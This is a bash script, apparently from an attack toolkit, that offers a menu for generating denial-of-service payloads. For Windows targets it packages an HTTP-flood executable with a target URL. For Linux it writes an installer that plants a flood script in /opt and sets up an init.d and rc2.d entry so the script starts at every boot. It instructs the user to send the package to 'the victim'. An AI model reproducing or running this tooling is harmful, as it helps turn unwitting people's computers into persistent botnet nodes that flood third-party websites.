clear
while :
do
echo ""
echo "Denial of Service (DoS / DDoS)"
echo "--------------------------------------"
echo ""
echo "  1.- Denial of Service (DoS)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo -n "Select an option [DoS & DDoS]> "
read op4
case $op4 in
1) echo "";
clear
while :
do
echo ""
echo "Denial of Service (DoS)"
echo "--------------------------------------"
echo ""
echo "  1.- Mirosoft Windows (DIR)"
echo "  2.- GNU/Linux (DIR)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [DoS]> "
read op31
case $op31 in
1) echo "[*] Target: Microsoft Windows System";
echo -n "Path to save the payload [DoS]> "
read pth31
echo -n "Name for the payload [DoS]> "
read name31
mkdir $pth31/$name31
cp bin/windows_http_flood.exe $pth31/$name31/$name31.exe
echo -n "DoS Target [DoS]> "
read target31
echo "$target31" > $pth31/$name31/t.txt
echo "[+] GENERATED IN: $pth31/$name31 ... NOW COMPRESS THE DIRECTORY AND SEND TO THE VICTIM!"
exit
;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Path to save the payload [DoS]> "
read pth32
echo -n "Name for the payload [DoS]> "
read name32
echo "Eg.: http://www.websi.te"
echo -n "DoS Target [DoS]> "
read target32
mkdir $name32
echo "chmod 777 $name32.sh
cp lib/mh.py /opt/linux00.py
cp lib/e.sh /opt/e.sh
chmod 777 /opt/linux00.py
chmod 777 /opt/e.sh
echo '#!/bin/sh 
      cd /opt
      sh e.sh
      exit' > linux00.sh
cp linux00.sh /etc/init.d/linux00.sh
rm linux00.sh
chmod 777 /etc/init.d/linux00.sh
ln -s /etc/init.d/linux00.sh /etc/rc2.d/S88linux000" > $name32/$name32.sh
cd $name32 
mkdir lib
cd ..
cp dep/mh.py $name32/lib/mh.py
echo "#!/bin/bash
python linux00.py $target32" > $name32/lib/e.sh
mv $name32 $pth32/$name32
echo "[+] GENERATED IN: $pth32/$name32 ... NOW COMPRESS THE DIRECTORY AND SEND TO THE VICTIM!"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op31 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op4 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done

